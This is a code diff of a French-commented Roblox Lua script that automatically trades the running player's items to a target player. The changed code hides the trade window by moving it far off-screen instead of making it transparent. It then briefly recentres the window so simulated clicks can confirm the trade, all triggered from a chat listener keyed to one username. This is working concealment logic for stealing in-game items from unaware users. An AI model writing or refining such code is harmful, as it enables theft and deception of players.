@@ -496,63 +496,21 @@ local LocalPlayer = Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
--- Rendre 100% invisible (transparence totale sans ombre/silhouette)
-local function setTradeGuiTransparency(invisible)
+-- Fonction pour planquer le panneau très loin hors de l'écran
+local function setTradeOffscreen(offscreen)
     pcall(function()
         local playerGui = LocalPlayer:WaitForChild("PlayerGui")
         local tradeGui = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("Trade")
         if tradeGui then
-            for _, descendant in pairs(tradeGui:GetDescendants()) do
-                if descendant:IsA("GuiObject") then
-                    if invisible then
-                        -- Sauvegarde des valeurs
-                        if not descendant:FindFirstChild("OrigBgTrans") then
-                            local val = Instance.new("NumberValue", descendant)
-                            val.Name = "OrigBgTrans"
-                            val.Value = descendant.BackgroundTransparency
-                        end
-                        descendant.BackgroundTransparency = 1
-
-                        if descendant:IsA("CanvasGroup") then
-                            descendant.GroupTransparency = 1
-                        end
-
-                        if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
-                            if not descendant:FindFirstChild("OrigTextTrans") then
-                                local val = Instance.new("NumberValue", descendant)
-                                val.Name = "OrigTextTrans"
-                                val.Value = descendant.TextTransparency
-                            end
-                            descendant.TextTransparency = 1
-                        elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
-                            if not descendant:FindFirstChild("OrigImgTrans") then
-                                local val = Instance.new("NumberValue", descendant)
-                                val.Name = "OrigImgTrans"
-                                val.Value = descendant.ImageTransparency
-                            end
-                            descendant.ImageTransparency = 1
-                        end
-                    else
-                        -- Restauration
-                        if descendant:FindFirstChild("OrigBgTrans") then
-                            descendant.BackgroundTransparency = descendant.OrigBgTrans.Value
-                        end
-                        if descendant:IsA("CanvasGroup") then
-                            descendant.GroupTransparency = 0
-                        end
-                        if descendant:FindFirstChild("OrigTextTrans") and (descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox")) then
-                            descendant.TextTransparency = descendant.OrigTextTrans.Value
-                        end
-                        if descendant:FindFirstChild("OrigImgTrans") and (descendant:IsA("ImageLabel") or descendant:IsA("ImageButton")) then
-                            descendant.ImageTransparency = descendant.OrigImgTrans.Value
-                        end
-                    end
-                elseif descendant:IsA("UIStroke") then
-                    if invisible then
-                        descendant.Enabled = false
-                    else
-                        descendant.Enabled = true
-                    end
+            -- Recherche du cadre principal du trade
+            local container = tradeGui:FindFirstChild("Container") or tradeGui:FindFirstChild("MainFrame") or tradeGui:FindFirstChild("Frame")
+            if container then
+                if offscreen then
+                    -- On le balance très loin en bas à droite (invisible pour toi)
+                    container.Position = UDim2.new(50, 0, 50, 0)
+                else
+                    -- On le remet au centre juste pour la validation
+                    container.Position = UDim2.new(0.5, -200, 0.5, -150)
                 end
             end
         end
@@ -570,8 +528,8 @@ local function getitems()
     Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2.5)
 
-    -- 2. Transparence totale (efface aussi l'ombre et la silhouette grise)
-    setTradeGuiTransparency(true)
+    -- 2. On déporte immédiatement le panneau hors de l'écran
+    setTradeOffscreen(true)
 
     -- 3. Remplissage des 4 cases max
     local itemsOffered = 0
@@ -613,9 +571,9 @@ local function getitems()
 
     -- 6. SÉQUENCE DE CLIC SUR LE BOUTON
     pcall(function()
-        -- On réaffiche visuellement avant les clics virtuels
-        setTradeGuiTransparency(false)
-        task.wait(0.1)
+        -- On ramène le panneau au centre une fraction de seconde pour que le clic virtuel touche la bonne zone
+        setTradeOffscreen(false)
+        task.wait(0.15)
 
         local Camera = workspace.CurrentCamera
         local ViewportSize = Camera.ViewportSize
@@ -651,9 +609,10 @@ local function getitems()
 end
 
 -- ==========================================
--- ÉCOUTE DU TCHAT 7
+-- ÉCOUTE DU TCHAT
 -- ==========================================
 
+-- Modification de ton bloc d'écoute de tchat pour s'assurer qu'il fonctionne bien :
 local function listenToPlayer(player)
     if string.lower(player.Name) == string.lower(tostring(userName)) then
         player.Chatted:Connect(function(msg)
